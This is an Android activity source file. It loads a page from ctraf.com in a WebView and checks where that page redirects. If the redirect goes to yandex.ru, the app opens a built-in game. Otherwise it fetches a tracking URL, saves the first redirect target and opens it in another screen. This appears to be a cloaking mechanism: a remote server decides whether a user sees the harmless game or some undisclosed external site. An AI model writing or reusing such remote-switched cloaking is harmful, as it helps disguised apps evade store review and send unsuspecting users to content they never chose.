package com.proect.naycon;

import androidx.appcompat.app.AlertDialog;
import androidx.appcompat.app.AppCompatActivity;

import android.app.ProgressDialog;
import android.content.Context;
import android.content.DialogInterface;
import android.content.Intent;
import android.content.SharedPreferences;
import android.net.ConnectivityManager;
import android.os.AsyncTask;
import android.os.Bundle;
import android.util.Log;
import android.webkit.WebView;
import android.webkit.WebViewClient;
import android.widget.TextView;

import java.util.ArrayList;
import java.util.Objects;

public class MainActivity extends AppCompatActivity {

     TextView textView;
    WebView webView;
    ProgressDialog progressDialog;
    String redirect = "";
    Intent intent;
    ArrayList<String> listRedirect = new ArrayList<>();
    SharedPreferences mSettings;
    SharedPreferences.Editor editor;
    String url_1;

    final static String URL_1 = "URL_1" ;


    protected boolean isOnline() {
        ConnectivityManager cm = (ConnectivityManager) getSystemService(Context.CONNECTIVITY_SERVICE);
        assert cm != null;
        return cm.getActiveNetworkInfo() != null;
    }


    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);

        setContentView(R.layout.activity_main);
        webView = findViewById(R.id.webview);
        textView = findViewById(R.id.text);


        mSettings = getSharedPreferences(URL_1, Context.MODE_PRIVATE);
        editor =  mSettings.edit();


        if(mSettings.contains(URL_1)) {
            url_1 = mSettings.getString(URL_1, "");
            textView.setText(url_1);
        }


        progressDialog = new ProgressDialog(MainActivity.this);
        progressDialog.show();
        progressDialog.setContentView(R.layout.progres_diolog);
        Objects.requireNonNull(progressDialog.getWindow()).setBackgroundDrawableResource(android.R.color.transparent);


        if (!isOnline()) {
            new AlertDialog.Builder(this)
                    .setTitle("Connection Failure")
                    .setMessage("Please Connect to the Internet")
                    .setPositiveButton(android.R.string.ok, new DialogInterface.OnClickListener() {
                        public void onClick(DialogInterface dialog, int which) {
                        }
                    })
                    .setIcon(android.R.drawable.ic_dialog_alert)
                    .show();


        }


        webView.loadUrl("http://ctraf.com/test");

        webView.setWebViewClient(new WebViewClient() {

            @Override
            public boolean shouldOverrideUrlLoading(WebView view, String url) {

                Log.d("My Webview", url);
                redirect = url;
                return false;
            }

            @Override
            public void onPageFinished(WebView view, String url) {
                super.onPageFinished(view, url);


                if (redirect.equals("https://yandex.ru/")) {
                    progressDialog.dismiss();

                    intent = new Intent(MainActivity.this, MainActivityGame.class);
                    startActivity(intent);
                } else {

                    webView.loadUrl("http://ctraf.com/track");
                    webView.setWebViewClient(new WebViewClient() {


                        @Override
                        public boolean shouldOverrideUrlLoading(WebView view, String url) {

                            Log.d("My Webview", url);

                            listRedirect.add(url);

                            return false;
                        }

                        @Override
                        public void onPageFinished(WebView view, String url) {
                            super.onPageFinished(view, url);
                            progressDialog.dismiss();
                            editor.putString(URL_1, listRedirect.get(0));
                            editor.apply();
                            intent = new Intent(MainActivity.this, MainActivityUrl1.class);
                            intent.putExtra("URL", listRedirect.get(0));
                            startActivity(intent);

                        }
                    });


                }


            }

        });





    }


}
